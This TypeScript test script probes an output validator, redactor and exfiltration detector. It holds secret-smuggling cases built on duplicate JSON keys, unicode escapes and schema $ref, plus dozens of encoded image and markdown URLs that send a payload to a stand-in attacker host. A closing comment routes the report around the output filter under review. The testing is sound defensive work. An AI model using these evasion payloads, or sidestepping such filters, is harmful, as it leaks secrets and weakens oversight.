// T24 recheck — independent probes of the pure validator after the T26 fix.
// Read-only: imports production code, mutates nothing. Synthetic credentials only.
import {
  validateOutputForTransport,
  validateSerializedContentForTransport,
} from "../../../../src/security/output-validation";
import { redactSensitiveText } from "../../../../src/security/redact";
import { detectExfil } from "../../../../src/security/detect/exfil";

const S = ["AKIA", "IOSFODNN7EXAMPLE"].join(""); // synthetic AWS-shaped key
const unchanged = (t: string) => redactSensitiveText(t) === t;

// ---------------------------------------------------------------- F-001
const f001 = {
  secretKey: (() => {
    const r = validateOutputForTransport({ format: "json", value: { [S]: "safe" } });
    return { ok: r.ok, leaked: r.text.includes(S), redaction: r.redaction, text: r.text };
  })(),
  secretKeyNested: (() => {
    const r = validateOutputForTransport({
      format: "json",
      value: { outer: [{ inner: { [S]: 1 } }] },
    });
    return { ok: r.ok, leaked: r.text.includes(S), redaction: r.redaction };
  })(),
  // approved-contract controls that must still pass
  safeKeyWithDigits: (() => {
    const r = validateOutputForTransport({
      format: "json",
      value: { user_id_12345: "ok", buildNumber7: 7 },
    });
    return { ok: r.ok, text: r.ok ? r.text : null, redaction: r.redaction };
  })(),
  numericStringKey: (() => {
    const r = validateOutputForTransport({
      format: "json",
      value: { "1234567890": "ok", "17251234567": 1 },
    });
    return { ok: r.ok, text: r.ok ? r.text : null, redaction: r.redaction };
  })(),
  passwordKeySafeValue: (() => {
    const r = validateOutputForTransport({ format: "json", value: { password: "hunter" } });
    return { ok: r.ok, text: r.ok ? r.text : null, redaction: r.redaction };
  })(),
  passwordKeyNumericValue: (() => {
    const r = validateOutputForTransport({ format: "json", value: { password: 123456789 } });
    return { ok: r.ok, redaction: r.redaction };
  })(),
  // key that carries the secret only after JSON unescaping
  unicodeEscapedKeyParsed: (() => {
    const escaped = `{"AKIA\\u0049OSFODNN7EXAMPLE":"safe"}`;
    const r = validateSerializedContentForTransport(escaped);
    return {
      ok: r.ok,
      leakedDecoded: r.text.includes(S),
      leakedEscaped: r.text.includes("AKIA\\u0049OSFODNN7EXAMPLE"),
      redaction: r.redaction,
    };
  })(),
  // key whose span is split by an astral char (should NOT match -> stays allowed)
  surrogateSplitKey: (() => {
    const key = "AKIA\u{1F600}IOSFODNN7EXAMPLE";
    const r = validateOutputForTransport({ format: "json", value: { [key]: "safe" } });
    return { ok: r.ok, redaction: r.redaction };
  })(),
  // possible NEW false rejections introduced by screening names
  emailKey: (() => {
    const r = validateOutputForTransport({
      format: "json",
      value: { "alice@example.com": { role: "owner" } },
    });
    return { ok: r.ok, redaction: r.redaction };
  })(),
  publicUrlKey: (() => {
    const r = validateOutputForTransport({
      format: "json",
      value: { "https://docs.example.org/guide": 1 },
    });
    return { ok: r.ok, redaction: r.redaction };
  })(),
  pathKey: (() => {
    const r = validateOutputForTransport({
      format: "json",
      value: { "src/security/service.ts": 12, "docs/requirements/roadmap.md": 3 },
    });
    return { ok: r.ok, redaction: r.redaction };
  })(),
  envAssignmentLookingKey: (() => {
    // a config map keyed by an env var name, value carried separately
    const r = validateOutputForTransport({
      format: "json",
      value: { OPENAI_API_KEY: "unset", DATABASE_URL: "unset" },
    });
    return { ok: r.ok, text: r.ok ? r.text : null, redaction: r.redaction };
  })(),
};

// ---------------------------------------------------------------- F-002
const f002 = {
  duplicateSecretThenSafe: (() => {
    const r = validateSerializedContentForTransport(`{"metric":"${S}","metric":"safe"}`);
    return { ok: r.ok, leaked: r.text.includes(S), redaction: r.redaction };
  })(),
  // the case persistence-sinks.test.ts requires to stay allowed-and-redacted
  secretPlusLongDigitRun: (() => {
    const r = validateSerializedContentForTransport(
      JSON.stringify({ metric: S, count: 123456789 }),
    );
    return { ok: r.ok, leaked: r.text.includes(S), text: r.ok ? r.text : null, redaction: r.redaction };
  })(),
  // both members safe, first overwritten: bytes restored?
  duplicateBothSafe: (() => {
    const raw = `{"a":"one","a":"two"}`;
    const r = validateSerializedContentForTransport(raw);
    return { ok: r.ok, text: r.ok ? r.text : null, bytesRestored: r.text === raw, redaction: r.redaction };
  })(),
  // ATTACK: secret hidden in a dropped duplicate, JSON-escaped so the raw-text
  // detectors do not see it and accountability finds no span at all.
  duplicateUnicodeEscapedSecret: (() => {
    const raw = `{"a":"AKIA\\u0049OSFODNN7EXAMPLE","a":"safe"}`;
    const r = validateSerializedContentForTransport(raw);
    return {
      ok: r.ok,
      bytesRestored: r.text === raw,
      leakedEscapedBytes: r.text.includes("AKIA\\u0049OSFODNN7EXAMPLE"),
      recoverableBySecondParse: (() => {
        try {
          return String(JSON.parse(`"AKIA\\u0049OSFODNN7EXAMPLE"`)) === S;
        } catch {
          return false;
        }
      })(),
      redaction: r.redaction,
    };
  })(),
  // ATTACK: contextual sensitive-field rule bypassed via a dropped duplicate whose
  // surviving value is empty (the contextual rule needs value.length > 0).
  duplicateSensitiveKeyEmptySurvivor: (() => {
    const raw = `{"pwd":"tr0ub4dor-correct-horse","pwd":""}`;
    const r = validateSerializedContentForTransport(raw);
    return {
      ok: r.ok,
      bytesRestored: r.text === raw,
      leakedCredential: r.text.includes("tr0ub4dor-correct-horse"),
      redaction: r.redaction,
    };
  })(),
  // control: same credential as the ONLY member is redacted by the contextual rule
  sensitiveKeySingleMember: (() => {
    const r = validateSerializedContentForTransport(`{"pwd":"tr0ub4dor-correct-horse"}`);
    return { ok: r.ok, leakedCredential: r.text.includes("tr0ub4dor-correct-horse"), redaction: r.redaction };
  })(),
  // FALSE REJECTION: an ordinary payload where a raw-text detector span straddles
  // the JSON separator between two members and therefore is in no scalar.
  urlThenEmailAcrossMembers: (() => {
    const raw = JSON.stringify({ docs: "https://example.com", note: "ping@host.example" });
    const r = validateSerializedContentForTransport(raw);
    return { raw, ok: r.ok, redaction: r.redaction };
  })(),
  urlThenEmailParsedDirect: (() => {
    const r = validateOutputForTransport({
      format: "json",
      value: { docs: "https://example.com", note: "ping@host.example" },
    });
    return { ok: r.ok, text: r.ok ? r.text : null, redaction: r.redaction };
  })(),
  cleanPayloadBytePreserved: (() => {
    const raw = `{"id":"safe-id","count":12,"ok":true,"nothing":null,"ratio":1.25}`;
    const r = validateSerializedContentForTransport(raw);
    return { ok: r.ok, bytesRestored: r.text === raw, redaction: r.redaction };
  })(),
  nonJsonTextUnchanged: (() => {
    const raw = "plain report line with no json";
    const r = validateSerializedContentForTransport(raw);
    return { ok: r.ok, identical: r.text === raw };
  })(),
};

// ---------------------------------------------------------------- F-003
const refCase = (schema: Record<string, unknown>, value: unknown) => {
  const r = validateOutputForTransport({ format: "json", value, schema });
  return { ok: r.ok, redaction: r.redaction, text: r.ok ? r.text : r.text };
};
const attackerToken = ["attacker", S].join("-");
const f003 = {
  refPlusMinLength: refCase(
    { $defs: { base: { type: "string" } }, $ref: "#/$defs/base", minLength: 20 },
    "short",
  ),
  refPlusType: refCase(
    { $defs: { base: { type: "string" } }, $ref: "#/$defs/base", type: "string" },
    "short",
  ),
  bareRefValid: refCase({ $defs: { base: { type: "string" } }, $ref: "#/$defs/base" }, "ok"),
  bareRefInvalidValue: refCase(
    { $defs: { base: { type: "string" } }, $ref: "#/$defs/base" },
    123,
  ),
  unresolvableRef: refCase({ $ref: "#/$defs/missing" }, "x"),
  foreignRef: refCase({ $ref: `https://schemas.invalid/${attackerToken}` }, "x"),
  refPlusDefsOnly: refCase({ $ref: "#/$defs/base", $defs: { base: { type: "string" } } }, "ok"),
  refPlusAnnotations: refCase(
    {
      $schema: "https://json-schema.org/draft/2020-12/schema",
      $id: "urn:x",
      title: "t",
      $defs: { base: { type: "string" } },
      $ref: "#/$defs/base",
    },
    "ok",
  ),
  nestedRefSibling: refCase(
    {
      type: "object",
      $defs: { base: { type: "string" } },
      properties: { a: { $ref: "#/$defs/base", minLength: 20 } },
    },
    { a: "short" },
  ),
  itemsRefSibling: refCase(
    {
      type: "array",
      $defs: { base: { type: "string" } },
      items: { $ref: "#/$defs/base", pattern: "^zzz" },
    },
    ["short"],
  ),
  defsRefSibling: refCase(
    {
      type: "string",
      $defs: { base: { type: "string" }, other: { $ref: "#/$defs/base", minLength: 20 } },
    },
    "short",
  ),
  reasonLeaksAttackerText: (() => {
    const r = validateOutputForTransport({
      format: "json",
      value: "x",
      schema: { $ref: `#/$defs/${attackerToken}`, minLength: 3 },
    });
    return {
      ok: r.ok,
      leaks: JSON.stringify(r).includes(attackerToken),
      redaction: r.redaction,
      text: r.text,
    };
  })(),
};

// ---------------------------------------------------------------- F-004
const ATT = "attacker.invalid";
const payload = "pixel?payload=context-fragment";
const img = (attr: string, v: string) => `<img ${attr}="${v}">`;
const f004Cases: Record<string, string> = {
  plainSrc: img("src", `https://${ATT}/${payload}`),
  decimalEntity: img("src", `https&#58;//${ATT}/${payload}`),
  decimalEntityNoSemi: img("src", `https&#58//${ATT}/${payload}`),
  hexEntityLower: img("src", `https&#x3a;//${ATT}/${payload}`),
  hexEntityUpperX: img("src", `https&#X3A;//${ATT}/${payload}`),
  namedEntity: img("src", `https&colon;//${ATT}/${payload}`),
  namedEntityMixedCase: img("src", `https&COLON;//${ATT}/${payload}`),
  doublyEncoded: img("src", `https&amp;#58;//${ATT}/${payload}`),
  zeroPadded7: img("src", `https&#0000058;//${ATT}/${payload}`),
  zeroPadded8: img("src", `https&#00000058;//${ATT}/${payload}`),
  zeroPadded10: img("src", `https&#0000000058;//${ATT}/${payload}`),
  hexZeroPadded7: img("src", `https&#x000003a;//${ATT}/${payload}`),
  tabInsideSchemeEntity: img("src", `ht&#9;tps://${ATT}/${payload}`),
  literalTabInsideScheme: img("src", `ht\ttps://${ATT}/${payload}`),
  newlineInsideScheme: img("src", `ht\ntps://${ATT}/${payload}`),
  leadingSpace: img("src", ` https://${ATT}/${payload}`),
  leadingNewline: img("src", `\nhttps://${ATT}/${payload}`),
  leadingTabEntity: img("src", `&#9;https://${ATT}/${payload}`),
  srcsetPlain: img("srcset", `https://${ATT}/${payload} 1x`),
  srcsetSchemeRelative: img("srcset", `//${ATT}/${payload} 1x`),
  srcsetEntity: img("srcset", `https&#58;//${ATT}/${payload} 1x`),
  srcsetSecondCandidate: img("srcset", `/local.png 1x, https://${ATT}/${payload} 2x`),
  srcsetNoDescriptor: img("srcset", `https://${ATT}/${payload}`),
  srcsetProtocolLess: img("srcset", `${ATT}/${payload} 1x`),
  srcsetLeadingSpaceCandidate: img("srcset", `  https://${ATT}/${payload} 1x`),
  srcSchemeRelative: img("src", `//${ATT}/${payload}`),
  markdownImage: `![x](https://${ATT}/${payload})`,
  markdownImageEntity: `![x](https&#58;//${ATT}/${payload})`,
  markdownReference: `![x][r]\n\n[r]: https://${ATT}/${payload}`,
  // controls that must stay unchanged
  ordinaryPublicLink: "[public documentation](https://docs.example.org/guide)",
  bareUrl: "See https://docs.example.org/guide for details.",
  relativeImage: `<img src="/assets/logo.png">`,
  dataUriImage: `<img src="data:image/png;base64,iVBORw0KGgo=">`,
};
const f004 = Object.fromEntries(
  Object.entries(f004Cases).map(([name, text]) => {
    const redacted = redactSensitiveText(text);
    const matches = detectExfil(text);
    return [
      name,
      {
        flagged: matches.length > 0,
        changed: redacted !== text,
        hostStillPresent: redacted.includes(ATT),
        policyIds: matches.map((m) => m.policyId),
        spans: matches.map((m) => text.slice(m.start, m.end)),
        redacted,
      },
    ];
  }),
);

// gdctx run pipes stdout through the same output floor under review, which would
// withhold this report. Write the evidence file directly and print only a receipt.
const { writeFileSync } = await import("node:fs");
const out = process.argv[2] ?? "/tmp/T24-recheck-validator.json";
writeFileSync(
  out,
  JSON.stringify(
    { f001, f002, f003, f004, controls: { ordinaryLinkUnchanged: unchanged(f004Cases.ordinaryPublicLink!) } },
    null,
    2,
  ),
);
console.log(`wrote ${out}`);
